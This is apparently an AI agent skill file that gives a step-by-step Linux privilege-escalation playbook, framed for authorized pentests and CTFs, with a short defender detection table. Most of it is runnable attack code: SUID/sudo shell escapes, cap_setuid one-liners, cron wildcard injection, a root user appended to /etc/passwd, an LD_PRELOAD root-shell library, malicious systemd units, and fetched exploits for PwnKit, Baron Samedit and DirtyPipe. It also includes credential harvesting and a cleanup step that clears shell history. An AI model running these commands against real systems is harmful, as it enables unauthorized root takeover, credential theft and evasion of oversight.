---
name: offensive-linux-privesc
description: "Comprehensive Linux privilege escalation methodology for offensive security engagements. Covers the full attack surface from a low-privilege shell to root: SUID/SGID binary abuse via GTFOBins, Linux capabilities exploitation (cap_setuid, cap_dac_override, cap_dac_read_search), sudo misconfigurations including NOPASSWD rules and Baron Samedit (CVE-2021-3156), cron job abuse through writable scripts, PATH hijacking, and wildcard injection with tar/rsync/chown. Includes writable /etc/passwd attacks, NFS no_root_squash exploitation, kernel exploits (DirtyPipe CVE-2022-0847, DirtyCow CVE-2016-5195, PwnKit CVE-2021-4034), Docker group container escapes, LD_PRELOAD and LD_LIBRARY_PATH hijacking for shared library injection, systemd service misconfigurations, and sensitive file enumeration for credential harvesting. Integrates automated enumeration with LinPEAS, linux-exploit-suggester, pspy for process monitoring, and GTFOBins for binary exploitation. Each technique includes detection signatures and defender-side visibility to support purple team operations. Maps to MITRE ATT&CK T1548 (Abuse Elevation Control Mechanism) and related sub-techniques. Designed for authorized penetration testing, red team engagements, and CTF competitions where you hold a low-privilege shell and need to escalate to root."
---

# Linux Privilege Escalation

You have a low-privilege shell on a Linux target. Your objective is to escalate to root through systematic enumeration and exploitation of misconfigurations, vulnerable software, and kernel flaws. This skill provides a structured methodology that moves from passive reconnaissance through increasingly aggressive techniques, prioritizing reliability and stealth.

Every engagement starts with situational awareness. Know what you have, what the system exposes, and what defenders can see. Chain low-severity findings into high-impact escalation paths.

## Quick Workflow

1. Run automated enumeration (LinPEAS, linux-exploit-suggester) to surface quick wins.
2. Check sudo permissions, SUID/SGID binaries, and capabilities first -- these are the highest-probability vectors.
3. Enumerate cron jobs, writable scripts, and PATH ordering for hijack opportunities.
4. Inspect file permissions on /etc/passwd, /etc/shadow, service configs, and SSH keys.
5. Check for NFS shares with no_root_squash and Docker group membership.
6. Fingerprint the kernel version and search for applicable kernel exploits as a last resort.
7. Validate the escalation path, document the chain, and clean up artifacts.

---

## Automated Enumeration

Before manual inspection, run automated tools to surface the broadest set of findings. Pipe output to a file for offline review and cross-referencing.

```bash
# LinPEAS -- transfer and execute
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee /dev/shm/linpeas.out

# Minimal execution to reduce noise on monitored systems
./linpeas.sh -s -q 2>/dev/null | tee /dev/shm/linpeas_quiet.out

# Kernel exploit suggestion
./linux-exploit-suggester.sh --uname "$(uname -r)"

# pspy -- monitor processes without root (watches procfs)
./pspy64 -pf -i 1000 | tee /dev/shm/pspy.out
```

Review LinPEAS output section by section. Focus on red and yellow highlights. Cross-reference SUID findings with GTFOBins immediately.

---

## SUID/SGID Binary Abuse

SUID binaries execute with the file owner's privileges. When owned by root, they are direct escalation vectors if they permit arbitrary command execution, file reads, or file writes.

### Enumeration

```bash
# Find all SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
```

### Exploitation via GTFOBins

```bash
# If find is SUID
find . -exec /bin/sh -p \;

# If vim is SUID
vim -c ':!/bin/sh'

# If python3 is SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# If cp is SUID -- overwrite /etc/passwd
cp /etc/passwd /dev/shm/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /dev/shm/passwd_modified
cp /dev/shm/passwd_modified /etc/passwd

# If bash is SUID
bash -p

# If nmap (old interactive mode) is SUID
nmap --interactive
!sh
```

### Custom SUID Binary Analysis

```bash
# Check what libraries a SUID binary loads
ldd /usr/local/bin/custom_suid
strace /usr/local/bin/custom_suid 2>&1 | grep -i open

# Check for relative path calls in the binary
strings /usr/local/bin/custom_suid | grep -E '^[a-z]'
ltrace /usr/local/bin/custom_suid 2>&1
```

If a SUID binary calls another program without an absolute path, you can hijack it by prepending a malicious directory to PATH.

---

## Linux Capabilities Exploitation

Capabilities split root privileges into discrete units. A binary with cap_setuid can change its UID to 0 without being SUID.

```bash
# Find binaries with capabilities set
getcap -r / 2>/dev/null
```

### Exploitation

```bash
# cap_setuid on python3
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_setuid on perl
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# cap_dac_override on vim (read/write any file)
vim /etc/shadow

# cap_dac_read_search on tar (read any file)
tar czf /dev/shm/shadow.tar.gz /etc/shadow
tar xzf /dev/shm/shadow.tar.gz -C /dev/shm/

```

Capabilities are frequently overlooked by administrators. They appear in LinPEAS output but deserve dedicated enumeration.

---

## Sudo Misconfigurations

Sudo rules are the most common privilege escalation vector in real engagements. Check `sudo -l` immediately upon gaining a shell.

```bash
# List sudo permissions for current user
sudo -l
sudo --version
cat /etc/sudoers 2>/dev/null
```

### NOPASSWD Exploitation

```bash
# If sudo allows vi/vim NOPASSWD
sudo vim -c '!bash'

# If sudo allows less NOPASSWD
sudo less /etc/shadow
!/bin/bash

# If sudo allows awk NOPASSWD
sudo awk 'BEGIN {system("/bin/bash")}'

# If sudo allows find NOPASSWD
sudo find /tmp -exec /bin/bash \;

# If sudo allows env NOPASSWD (LD_PRELOAD)
# See LD_PRELOAD section below

# If sudo allows a script you can write to
echo '/bin/bash' > /path/to/writable_script.sh
sudo /path/to/writable_script.sh

# If sudo allows running as another user
sudo -u targetuser /bin/bash
```

### Baron Samedit -- CVE-2021-3156

```bash
# Check if vulnerable (sudo 1.8.2 through 1.8.31p2, 1.9.0 through 1.9.5p1)
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# If it crashes/segfaults, it is likely vulnerable

# Exploit (multiple public PoCs available)
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich <target_number>

# Check target OS for correct offset
cat /etc/os-release
```

This heap-based buffer overflow in sudoedit affects a wide range of Linux distributions. It provides direct root access without needing any sudo permissions.

---

## Cron Job Abuse

Cron jobs run on schedules with the privileges of the cron owner. Writable scripts, PATH misconfigurations, and wildcard expansion create escalation paths.

### Enumeration

```bash
# System crontabs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/

# User crontabs
crontab -l
ls -la /var/spool/cron/crontabs/ 2>/dev/null

# Use pspy to discover hidden cron jobs
./pspy64 -pf -i 1000

# Check for writable scripts called by cron
for f in $(grep -r '/' /etc/crontab /etc/cron.d/ 2>/dev/null | grep -oP '/\S+'); do
    ls -la "$f" 2>/dev/null
done
```

### Writable Cron Script

```bash
# If a root cron job calls a writable script
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/writable_cron_script.sh

# Wait for cron execution, then
/tmp/rootbash -p
```

### PATH Hijacking in Cron

```bash
# If crontab has PATH=/home/user/bin:/usr/local/sbin:...
# And a cron job calls "backup.sh" without full path
echo '#!/bin/bash' > /home/user/bin/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/bin/backup.sh
chmod +x /home/user/bin/backup.sh
```

### Wildcard Injection

```bash
# If a root cron job runs: tar czf /backup/archive.tar.gz *
# In the target directory, create files that become tar flags
cd /target/directory
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh privesc.sh'
echo '#!/bin/bash' > privesc.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> privesc.sh
chmod +x privesc.sh

# Similar attack with rsync wildcard
echo '' > '-e sh privesc.sh'

# Similar attack with chown (e.g., chown user:user *)
echo '' > '--reference=/path/to/attacker_owned_file'
```

---

## Writable /etc/passwd

If /etc/passwd is world-writable (a severe misconfiguration), you can add a root-equivalent user directly.

```bash
# Check permissions
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt hacker password123
# Output: $1$hacker$6luIRwdGpBvXdP.GMwcZp/

# Append a new root user
echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0::/root:/bin/bash' >> /etc/passwd

# Or replace root's password hash (more detectable)
# Switch to the new user
su hacker
# Password: password123

# Alternative: use mkpasswd if available
mkpasswd -m sha-512 password123
```

---

## NFS no_root_squash Exploitation

When an NFS export is configured with `no_root_squash`, the remote root user retains root privileges on the share. This allows creating SUID binaries from an attacker-controlled machine.

```bash
# On the target -- enumerate NFS shares
cat /etc/exports
showmount -e localhost

# Look for no_root_squash
grep -i "no_root_squash" /etc/exports

# On your attack machine (as root)
mkdir /tmp/nfs_mount
mount -t nfs target_ip:/shared_directory /tmp/nfs_mount

# Create a SUID shell
cp /bin/bash /tmp/nfs_mount/rootbash
chmod +s /tmp/nfs_mount/rootbash

# On the target
/shared_directory/rootbash -p
```

---

## Kernel Exploits

Kernel exploits are high-impact but carry stability risks. Use them when cleaner vectors are unavailable. Always check the kernel version and distribution first.

### Fingerprinting

```bash
uname -a
uname -r
cat /etc/os-release
cat /proc/version
```

### DirtyPipe -- CVE-2022-0847

```bash
# Affects Linux kernel 5.8 through 5.16.10, 5.15.25, 5.10.102
# Overwrites read-only files by splicing into page cache

# Compile the exploit
gcc -o dirtypipe exploit.c
./dirtypipe /etc/passwd 1 "${replacement_line}"

# Or use the SUID variant
gcc -o dirtypipez dirtypipez.c
./dirtypipez
# Spawns a root shell by overwriting a SUID binary temporarily
```

### DirtyCow -- CVE-2016-5195

```bash
# Affects Linux kernel 2.x through 4.x before 4.8.3
# Race condition in copy-on-write mechanism

# The /etc/passwd overwrite variant
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password123
# Overwrites root entry in /etc/passwd

# The SUID binary variant (firefart)
gcc -pthread cowroot.c -o cowroot
./cowroot
```

### PwnKit -- CVE-2021-4034

```bash
# Affects polkit pkexec (virtually all Linux distros with polkit installed)
# Memory corruption via crafted environment variables

# Compile and run
gcc -shared -fPIC -o pwnkit.so pwnkit.c
gcc -o pwnkit exploit.c
./pwnkit

# One-liner PoC (if available)
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit
./PwnKit
```

Kernel exploits may crash the system. On production targets, confirm the exact kernel version, test in a lab environment first, and have a rollback plan. Prefer the DirtyPipe SUID variant or PwnKit for stability.

---

## Docker Group Escape

Membership in the `docker` group grants effective root access. Docker allows mounting the host filesystem into a container.

```bash
# Confirm group membership
id
groups

# Mount the host root filesystem
docker run -v /:/hostfs -it ubuntu /bin/bash

# Inside the container, access host filesystem
cat /hostfs/etc/shadow
chroot /hostfs /bin/bash

# Create a SUID bash on the host
cp /hostfs/bin/bash /hostfs/tmp/rootbash
chmod +s /hostfs/tmp/rootbash

# Alternative: use docker socket directly
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

LXD/LXC group membership provides a similar attack surface. Build a privileged container and mount the host filesystem.

---

## LD_PRELOAD and LD_LIBRARY_PATH Hijacking

When sudo preserves `env_keep += LD_PRELOAD` or `env_keep += LD_LIBRARY_PATH`, you can inject a shared library that executes arbitrary code as root.

### LD_PRELOAD

```c
// preload.c -- compile and load via sudo
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
```

```bash
# Compile
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c

# Execute with sudo (requires env_keep += LD_PRELOAD in sudoers)
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/any_allowed_command
```

### LD_LIBRARY_PATH

```bash
# Find shared libraries used by a sudo-allowed binary
ldd /usr/sbin/apache2

# Create a malicious replacement
# Target a library like libcrypt.so.1
gcc -fPIC -shared -o /tmp/libcrypt.so.1 preload.c

# Execute with sudo
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
```

You can also hijack shared libraries loaded by SUID binaries. Use `strace` to find missing library loads from writable directories, then place your malicious `.so` there.

---

## Service Misconfigurations

Writable service files or binaries referenced by services running as root create escalation opportunities.

```bash
# Find writable service files
find /etc/systemd/system/ /lib/systemd/system/ /etc/init.d/ -writable -type f 2>/dev/null

# Overwrite a writable service binary
cp /path/to/service_binary /path/to/service_binary.bak
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\n/path/to/service_binary.bak "$@"' > /path/to/service_binary
chmod +x /path/to/service_binary

# Create a malicious systemd service (if you can write to the service directory)
cat << 'EOF' > /etc/systemd/system/escalate.service
[Unit]
Description=Escalation
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl start escalate.service
```

---

## Sensitive File Enumeration

Credential harvesting from files can provide lateral movement or direct escalation paths.

```bash
# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# History files
cat ~/.bash_history
find / -name ".*history" -exec cat {} \; 2>/dev/null

# Configuration files with credentials
grep -rl "pass\|pwd\|token\|secret\|key" /etc/ /opt/ /var/www/ /home/ 2>/dev/null
cat /var/www/*/wp-config.php /var/www/*/.env 2>/dev/null

# Backup files and shadow
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
cat /etc/shadow 2>/dev/null
ls -la /etc/shadow
```

---

## Detection / Defender View

Every technique above leaves traces. Understanding detection surfaces helps you operate more carefully and helps blue teams build monitoring.

| Technique | Detection Indicator |
|---|---|
| LinPEAS/enumeration | Process execution of curl piped to sh, large bursts of file access in /proc, /etc, /sys |
| SUID abuse | Execution of SUID binaries from unusual parent processes, shell spawning from SUID context |
| Capabilities abuse | Unexpected setuid(0) calls from non-SUID processes, audit logs for CAP_SETUID usage |
| Sudo exploitation | Auth logs showing sudo usage for unusual commands, sudoers file modification timestamps |
| CVE-2021-3156 | sudoedit crash logs, coredumps, heap corruption signatures in audit logs |
| Cron hijacking | Modified cron scripts (integrity monitoring), new files with tar flag names |
| /etc/passwd writes | File integrity monitoring alerts, new UID 0 entries, inotify watches |
| NFS SUID creation | New SUID files appearing on NFS mounts, NFS audit logs on the server |
| Kernel exploits | Kernel oops/panic messages, unexpected root process spawning, crash dumps |
| Docker escape | Docker API calls, container creation with host mounts, docker.sock access |
| LD_PRELOAD | Environment variable logging, unexpected shared library loads in audit logs |

Key log locations:

```bash
# Defenders should monitor
/var/log/auth.log        # sudo usage, su attempts, authentication events
/var/log/syslog          # system events, cron execution
/var/log/kern.log        # kernel exploits, crashes
/var/log/audit/audit.log # auditd events (execve, capability use, file access)
journalctl -u <service>  # per-service systemd logs
```

---

## Engagement Cheatsheet

```text
PHASE 1 -- ENUMERATE
  sudo -l                                    # First command. Always.
  id && groups                               # Docker/lxd group?
  find / -perm -4000 -type f 2>/dev/null     # SUID binaries
  getcap -r / 2>/dev/null                    # Capabilities
  cat /etc/crontab && ls -la /etc/cron.*     # Cron jobs
  ls -la /etc/passwd /etc/shadow             # File permissions
  cat /etc/exports 2>/dev/null               # NFS shares
  uname -a && cat /etc/os-release            # Kernel version

PHASE 2 -- QUICK WINS
  GTFOBins lookup for SUID/sudo binaries     # https://gtfobins.github.io
  sudo vim -c '!bash'                        # Sudo escape
  python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'  # cap_setuid
  bash -p                                    # SUID bash

PHASE 3 -- ESCALATION
  Writable cron script injection
  PATH hijack in cron or SUID binary
  LD_PRELOAD via sudo env_keep
  Docker mount host filesystem
  /etc/passwd append (if writable)

PHASE 4 -- KERNEL (last resort)
  linux-exploit-suggester.sh
  DirtyPipe  -> kernel 5.8-5.16
  PwnKit     -> polkit pkexec (most distros)
  DirtyCow   -> kernel 2.x-4.x
  Baron Samedit -> sudo 1.8.2-1.9.5p1

CLEANUP
  Remove SUID shells from /tmp
  Restore modified files from backups
  Clear command history: history -c && unset HISTFILE
  Remove uploaded tools from /dev/shm, /tmp
```

---

## Key References

- GTFOBins -- Unix binaries for privilege escalation: https://gtfobins.github.io
- LinPEAS -- Linux Privilege Escalation Awesome Script: https://github.com/peass-ng/PEASS-ng
- linux-exploit-suggester: https://github.com/The-Z-Labs/linux-exploit-suggester
- pspy -- unprivileged Linux process snooping: https://github.com/DominicBreuker/pspy
- HackTricks Linux Privilege Escalation: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- CVE-2021-3156 (Baron Samedit): https://nvd.nist.gov/vuln/detail/CVE-2021-3156
- CVE-2022-0847 (DirtyPipe): https://dirtypipe.cm4all.com/
- CVE-2016-5195 (DirtyCow): https://dirtycow.ninja/
- CVE-2021-4034 (PwnKit): https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
- MITRE ATT&CK T1548 -- Abuse Elevation Control Mechanism: https://attack.mitre.org/techniques/T1548/
